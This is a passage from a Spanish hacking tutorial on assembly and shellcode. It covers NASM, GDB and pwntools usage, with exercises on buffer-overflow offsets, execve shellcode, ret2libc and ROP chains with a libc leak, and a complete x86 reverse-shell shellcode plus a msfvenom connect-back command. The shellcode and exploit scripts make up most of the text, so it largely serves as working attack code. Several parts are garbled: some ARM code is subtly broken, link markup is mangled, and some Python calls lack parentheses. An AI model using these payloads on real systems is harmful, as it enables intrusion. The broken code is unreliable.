_start: ; Poner "/bin/sh" en la pila byte por byte mov r0, #0x2f ; "/" lsl r0, r0, #8 ; r0 = 0x2f00 add r0, #0x62 ; r0 = 0x2f62 ("/b") lsl r0, r0, #8 ; r0 = 0x2f6200 add r0, #0x69 ; r0 = 0x2f6269 ("/bi") lsl r0, r0, #8 ; r0 = 0x2f626900 add r0, #0x6e ; r0 = 0x2f62696e ("/bin") lsl r0, r0, #8 ; r0 = 0x2f62696e00 add r0, #0x2f ; r0 = 0x2f62696e2f ("/bin/") lsl r0, r0, #8 ; r0 = 0x2f62696e2f00 add r0, #0x73 ; r0 = 0x2f62696e2f73 ("/bin/s") lsl r0, r0, #8 ; r0 = 0x2f62696e2f7300 add r0, #0x68 ; r0 = 0x2f62696e2f7368 ("/bin/sh") push {r0} ; poner el string en la pila mov r0, sp ; r0 = puntero al string ; Limpiar argumentos eor r1, r1, r1 ; r1 = 0 (argv) eor r2, r2, r2 ; r2 = 0 (envp) ; Syscall mov r7, #11 ; execve svc 0
```

Este shellcode no tiene null bytes y funciona en Thumb. Tamaño: ~40 bytes.

Compilar:

```bash
arm-linux-gnueabi-as -o thumb_sh.o thumb_sh.s
arm-linux-gnueabi-ld -o thumb_sh thumb_sh.o
arm-linux-gnueabi-objcopy -O binary thumb_sh thumb_sh.bin
hexdump -C thumb_sh.bin
```

---

## 13. Herramientas

### 13.1 Nasmmbly-f0r y YASM

**NASM (Netwide Assembler):** el ensamblador más popular para [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86)/[x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64).

```bash
# Compilar para 32 bits
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 shellcode.o -o shellcode

# Compilar para 64 bits
nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode

# Formato bin (raw, sin ELF) para shellcode
nasm -f bin -o shellcode.bin shellcode.asm

# Generar listing con bytes
nasm -f bin shellcode.asm -l shellcode.lst
```

Ejemplo de NASM para shellcode:

```nasm
; shellcode_nasm.asm
BITS 32

global _start

section .text

_start: xor eax, eax push eax push 0x68732f2f push 0x6e69622f mov ebx, esp xor ecx, ecx xor edx, edx mov al, 11 int 0x80
```

**YASM:** fork de NASM con soporte adicional.

```bash
yasm -f elf32 shellcode.asm -o shellcode.o
```

### 13.2 GDB: layout [asm](../raw/4ss3mbly-f0r-h4ck3rs.md), info registers, x/, stepi

GDB es el debugger esencial para entender exploits:

```bash
# Iniciar GDB
gdb ./vuln

# Ver assembly (layout)
layout asm # vista assembly
layout regs # vista registros
layout split # ambas

# O sin TUI:
set disassembly-flavor intel # o att
disassemble main # desensamblar función

# Puntos de quiebre
break *0x401000 # break en dirección
break main # break en función

# Información
info registers # todos los registros
info registers eax esp ebp # registros específicos
info frame # info del stack frame
info proc mappings # mapa de memoria del proceso

# Examinar memoria
x/10x $esp # 10 hex words desde ESP
x/20i $eip # 20 instrucciones desde EIP
x/s $ebx # string en EBX
x/gx $rsp # 8 bytes en RSP (64 bits)

# Ejecución
run # ejecutar
run < input.txt # ejecutar con input
stepi # una instrucción
si # abreviatura
nexti # saltar CALLs
continue # continuar

# Breakpoint condicional
break *0x401000 if $eax == 5

# Ver stack
backtrace # stack trace
frame 0 # frame actual
up/down # navegar frames

# GDB + pwntools
# Desde pwntools:
io = gdb.debug('./vuln', 'break *0x401000\ncontinue')
```

### 13.3 pwntools: asm, disasm, make_elf

pwntools es el kit definitivo para [exploit](../raw/m3t4spl01t.md#exploits) development en [python](../raw/pyth0n-f0r-h4ck1ng.md):

```python
from pwn import *

# Configurar contexto
context.arch = 'i386' # i386, amd64, arm, thumb
context.os = 'linux'
context.log_level = 'debug' # debug, info, warn, error

# Ensamblar
shellcode = asm(""" xor eax, eax push eax push 0x68732f2f push 0x6e69622f mov ebx, esp xor ecx, ecx xor edx, edx mov al, 11 int 0x80
""")
print(len(shellcode)  # 21

# Desensamblar
print(disasm(shellcode)

# Crear ELF desde shellcode
elf = make_elf(shellcode)
with open('test_shellcode', 'wb') as f: f.write(elf)

# Shellcode pre-hecho
shellcraft.i386.linux.sh
shellcraft.amd64.linux.sh
shellcraft.arm.linux.sh

# Ejecutar shellcode local
io = run_shellcode(shellcraft.i386.linux.sh)
io.sendline(b'whoami')
io.interactive

# Conexión remota
r = remote('10.0.0.1', 4444)
r.send(shellcode)

# Pattern cycling
pattern = cyclic(200)
offset = cyclic_find(b'laaa')  # buscar en EIP

# Empaquetar
p32(0xdeadbeef) # \xef\xbe\xad\xde
p64(0xdeadbeef) # \xef\xbe\xad\xde\x00\x00\x00\x00

# Empaquetar con signo
pack(0xdeadbeef, 32, 'little', 'unsigned')

# ROP automation
elf = ELF('./vuln')
rop = ROP(elf)
rop.call('system', ['/bin/sh'])
rop.call('exit', [0])
print(rop.dump)
payload = rop.chain

# ELF utils
elf.symbols['system'] # dirección de system
elf.got['puts'] # dirección en GOT
elf.plt['puts'] # dirección en PLT
elf.search(b'/bin/sh').__next__  # dirección del string

# Buscar gadgets
rop.find_gadget(['pop rdi', 'ret'])[0]

# Logging
log.info(f"Offset: {offset}")
log.success("Exploit funcionó!")
log.error("Algo salió mal")
```

### 13.4 objdump y ndisasm

**objdump:** viene con binutils, desensambla binarios:

```bash
# Desensamblar sección .text
objdump -d ./programa

# En Intel syntax
objdump -d -M intel ./programa

# Solo una función
objdump -d -M intel --disassemble=main ./programa

# Ver todas las secciones
objdump -x ./programa

# Extraer bytes de shellcode
objdump -d ./shellcode | grep -Po '\s[0-9a-f]{2}(?=\s)' | tr -d '\n' | sed 's/./\\x&/g'

# Ver headers
objdump -p ./programa # PE headers (Windows)
objdump -f ./programa # file headers
```

**ndisasm:** desensambla raw bytes:

```bash
# Desensamblar shellcode.bin (16 bits por defecto)
ndisasm -b 32 shellcode.bin

# Offset inicial
ndisasm -b 32 -o 0x1000 shellcode.bin

# Ejemplo:
echo -ne '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' | ndisasm -b 32 -
```

### 13.5 Online emuladores y sandboxes

- **OnlineGDB:** httpss)://www.onlinegdb.[com](../raw/w1n-s9bsyst3ms.md#com)/ (debugger online con vista [assembly](../raw/4ss3mbly-f0r-h4ck3rs.md))
- **Compiler Explorer (godbolt):** [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://godbolt.org/ (compila C a assembly en vivo)
- **reconverter:** https://reconverter.com/ (convierte entre ASM y bytes)
- **Unprotect:** [http](../raw/r3d3s-f0nd4m3nt0s.md#http)://unprotect.shell.surf/ (técnicas de shellcode)
- **ShellStorm:** http://shell-storm.org/shellcode/ (base de datos de shellcode)
- **Exploit DB:** https://www.exploit-db.com/ (shellcode y exploits)
- **Armconverter:** https://armconverter.com/ (convierte instrucciones ARM a bytes)

---

## 14. Ejercicios Prácticos

### 14.1 Ejercicio 1: Leer un disassemblymbly-f0r simple

Dado el siguiente disassembly de IDA, reconstruí la función C original:

```nasm
.text:00401000  push ebp
.text:00401001  mov ebp, esp
.text:00401003  sub esp, 8
.text:00401006  mov dword [ebp-4], 0
.text:0040100D  mov dword [ebp-8], 1
.text:00401014  mov eax, [ebp-4]
.text:00401017  add eax, [ebp-8]
.text:0040101A  mov esp, ebp
.text:0040101C  pop ebp
.text:0040101D  ret
```

**Preguntas:**
1. ¿Cuántas variables locales tiene?
2. ¿Qué valores se asignan?
3. ¿Qué devuelve la función?
4. ¿Cuál sería el código C?

<details>
<summary>Ver solución</summary>

1. Dos variables locales: [ebp-4] y [ebp-8]
2. Se asigna 0 a [ebp-4] y 1 a [ebp-8]
3. Devuelve la suma: 0 + 1 = 1
4. Código C:
```c
int funcion { int a = 0; int b = 1; return a + b;
}
```
</details>

### 14.2 Ejercicio 2: Encontrar el offset en un overflow

Tenés este programa vulnerable:

```c
#include <stdio.h>
#include <string.h>

void vuln(char *input) { char buf[32]; strcpy(buf, input); printf("Copiado: %s\n", buf);
}

int main(int argc, char **argv) { if (argc > 1) { vuln(argv[1]); } return 0;
}
```

**Pasos:**
1. compilalo: `gcc -fno-stack-protector -o vuln vuln.c`
2. Probá con: `./vuln AAAA..` hasta crashear
3. Usá pwntools para encontrar el offset exacto
4. ¿Cuál es el offset al return address?

<details>
<summary>Ver solución</summary>

```python
from pwn import *

# Generar pattern
pattern = cyclic(100)
print(pattern)

# Ejecutar con el pattern (usamos GDB para ver EIP)
# p = process('./vuln', stdin=PTY)
# p.sendline(pattern)
# p.wait
# En GDB: info registers eip -> 0x6161616c

offset = cyclic_find(b'laaa')  # los bytes en EIP
print(f"Offset: {offset}") # 32 (tamaño de buf) + 4 (EBP) = 36

# Verificación:
payload = b'A' * offset + b'BBBB'
# Si EIP = 0x42424242, está confirmado
```
</details>

### 14.3 Ejercicio 3: Escribir shellcode execve

Escribí shellcode Linux [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86) (null-byte free) para `execve("/bin/sh", NULL, NULL)`.

**Requisitos:**
- Máximo 30 bytes
- Sin null bytes
- Position-independent

<details>
<summary>Ver solución</summary>

```nasm
; execve("/bin/sh", 0, 0) - 21 bytes
BITS 32

xor eax, eax ; 31 c0
push eax ; 50
push 0x68732f2f ; 68 2f 2f 73 68
push 0x6e69622f ; 68 2f 62 69 6e
mov ebx, esp ; 89 e3
xor ecx, ecx ; 31 c9
xor edx, edx ; 31 d2
mov al, 11 ; b0 0b
int 0x80 ; cd 80
```

Bytes: `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80`

Verificación con pwntools:
```python
from pwn import *
context.arch = 'i386'

sc = asm(""" xor eax, eax push eax push 0x68732f2f push 0x6e69622f mov ebx, esp xor ecx, ecx xor edx, edx mov al, 11 int 0x80
""")

print(f"Tamaño: {len(sc)} bytes")
print(f"Null bytes: {sc.find(b'\\x00')}")
```
</details>

### 14.4 Ejercicio 4: Crear un ROP chain simple

Dado:
- offset = 36
- system en 0xf7e12345
- "/bin/sh" string en 0xf7f65432
- exit en 0xf7e67890

Armá el [payload](../raw/m3t4spl01t.md#payloads) de ret2libc.

<details>
<summary>Ver solución</summary>

```python
from pwn import *

offset = 36
system_addr = 0xf7e12345
binsh_addr = 0xf7f65432
exit_addr = 0xf7e67890

payload = b'A' * offset
payload += p32(system_addr) # EIP -> system
payload += p32(exit_addr) # return from system -> exit
payload += p32(binsh_addr) # argumento: "/bin/sh"

# Enviar payload
# p = process('./vuln')
# p.sendline(payload)
# p.interactive
```
</details>

### 14.5 Ejercicio 5: ARM Thumb shellcode

Escribí shellcode ARM Thumb para execve("/bin/sh").

<details>
<summary>Ver solución</summary>

```nasm
; ARM Thumb shellcode execve(/bin/sh)
.section .text
.global _start
.code 16

_start: ; Cargar "/bin/sh" en la pila adr r3, binsh eor r1, r1, r1 eor r2, r2, r2 mov r0, r3 mov r7, #11 svc 0 ; exit(0) por si execve falla mov r7, #1 eor r0, r0, r0 svc 0

binsh: .ascii "/bin/sh" .byte 0
```

Compilar:
```bash
arm-linux-gnueabi-as -o thumb_sh.o thumb_sh.s
arm-linux-gnueabi-ld -o thumb_sh thumb_sh.o
arm-linux-gnueabi-objcopy -O binary thumb_sh thumb_sh.bin
```
</details>

### 14.6 Ejercicio 6: Usar pwntools para armar un [exploit](../raw/m3t4spl01t.md#exploits)

Completá el exploit para un binario vulnerable con stack canary y NX:

```python
from pwn import *

# Completar:
# 1. Cargar el binario
# 2. Encontrar gadgets (pop rdi; ret)
# 3. Armar ROP chain llamando a system("/bin/sh")
# 4. Conectar al remoto

context.arch = 'amd64'

def exploit: # Completar acá pass

if __name__ == '__main__': exploit
```

<details>
<summary>Ver solución</summary>

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./vuln')
libc = ELF('./libc.so.6')  # o la versión del sistema

# Gadgets
pop_rdi = 0x4012b3  # pop rdi; ret
ret = 0x40101a # ret (para stack alignment)

# Direcciones sin ASLR (o con leak)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

def exploit: # Leak de libc offset = 72  # encontrado con cyclic rop_leak = b'A' * offset rop_leak += p64(pop_rdi) rop_leak += p64(puts_got) rop_leak += p64(puts_plt) rop_leak += p64(main_addr)  # volver a main para segunda etapa # Enviar leak p = process('./vuln') p.sendline(rop_leak) p.recvline  # output de puts # Parsear leak leak = u64(p.recvline.strip.ljust(8, b'\x00') libc.address = leak - libc.symbols['puts'] log.info(f"Libc base: {hex(libc.address)}") # Segunda etapa: system("/bin/sh") binsh = next(libc.search(b'/bin/sh\x00') system = libc.symbols['system'] rop_shell = b'A' * offset rop_shell += p64(ret) # stack alignment (16 bytes) rop_shell += p64(pop_rdi) rop_shell += p64(binsh) rop_shell += p64(system) p.sendline(rop_shell) p.interactive

if __name__ == '__main__': exploit
```
</details>

### 14.7 Ejercicio 7: Leer un [switch](../raw/r3d3s-f0nd4m3nt0s.md#switches) en IDA

Identificá si esto es un switch y reconstruí el C:

```nasm
.text:00401020  mov eax, [ebp+arg0]
.text:00401023  cmp eax, 4
.text:00401026  ja default_case
.text:0040102C  jmp [jump_table + eax*4]

; Jump table:
.data:00402000 jump_table dd case0, case1, case2, case3, case4
```

<details>
<summary>Ver solución</summary>

```c
void func(int x) { switch(x) { case 0: /* case0 */ break; case 1: /* case1 */ break; case 2: /* case2 */ break; case 3: /* case3 */ break; case 4: /* case4 */ break; default: /* default_case */ break; }
}
```
</details>

### 14.8 Ejercicio 8: [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) shellcode

Buscá y explicá cómo funciona un shellcode de reverse shell (conecta a una [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) y [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos), da una shell).

<details>
<summary>Ver solución</summary>

```nasm
; Linux x86 reverse shell (connect-back)
; Conecta a 192.168.1.100:4444 y ejecuta /bin/sh

BITS 32

; 1. Crear socket: socket(AF_INET, SOCK_STREAM, 0)
push byte 6 ; IPPROTO_TCP
push byte 1 ; SOCK_STREAM
push byte 2 ; AF_INET
mov ecx, esp ; argv
xor ebx, ebx
mov bl, 1 ; socketcall number: sys_socket
mov eax, 102 ; sys_socketcall
int 0x80
mov edi, eax ; guardar socket fd

; 2. Conectar: connect(sockfd, &sockaddr, 16)
push dword 0x6401a8c0  ; 192.168.1.100 (invertido)
push word 0x5c11 ; 4444 (0x115c en little endian)
push word 2 ; AF_INET
mov ecx, esp ; puntero a estructura sockaddr
push byte 16 ; addrlen
push ecx ; sockaddr
push edi ; sockfd
mov ecx, esp ; argv
xor ebx, ebx
mov bl, 3 ; sys_connect
mov eax, 102
int 0x80

; 3. Duplicar descriptores: dup2(sockfd, 0/1/2)
xchg eax, ebx ; eax = 3 (sys_close.. no, usamos ebx)
push byte 2
pop ecx ; ecx = 2
loop: mov ebx, edi ; sockfd mov eax, 63 ; dup2 int 0x80 dec ecx jns loop ; para 2, 1, 0

; 4. execve("/bin/sh", NULL, NULL)
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 11
int 0x80
```

Nota: las [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) y puertos se ponen en el shellcode después. Msfvenom genera estos dinámicamente:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
```
</details>

---

## 15. Referencias

- **Intel SDM (Software Developer Manual):** httpss)://www.intel.[com](../raw/w1n-s9bsyst3ms.md#com)/content/www/us/en/developer/articles/technical/intel-sdm.html
- **ARM Architecture Reference Manual:** [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://developer.arm.com/documentation
- **"Smashing The Stack For Fun And Profit"** - Aleph One (Phrack 49)
- **"The Geometry of Innocent Flesh on the Bone"** - (Return-to-libc, Phrack)
- **pwntools docs:** https://docs.pwntools.com/
- **ROPgadget tool:** https://github.com/JonathanSalwan/ROPgadget
- **Shell-Storm Shellcode DB:** [http](../raw/r3d3s-f0nd4m3nt0s.md#http)://shell-storm.org/shellcode/
- **[exploit](../raw/m3t4spl01t.md#exploits) DB:** https://www.[exploit](../raw/m3t4spl01t.md#exploits)-db.com/
- **ARM Shellcode (Azeria):** https://azeria-labs.com/writing-arm-shellcode/
- **[ghidra](../raw/4pk-r3v3rs1ng.md#ghidra):** https://[ghidra](../raw/4pk-r3v3rs1ng.md#ghidra)-sre.org/
- **IDA Free:** https://hex-rays.com/ida-free/
- **Nasm Manual:** https://www.nasm.us/doc/
- **[x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86)-64 calling conventions:** https://wiki.osdev.org/Calling_Conventions
- **Linux [syscall](../raw/0s-f0nd4m3nt0s.md#syscalls) table:** https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_32.tbl

---
*Fin del tutorial 4ss3mbly-f0r-h4ck3rs.md*

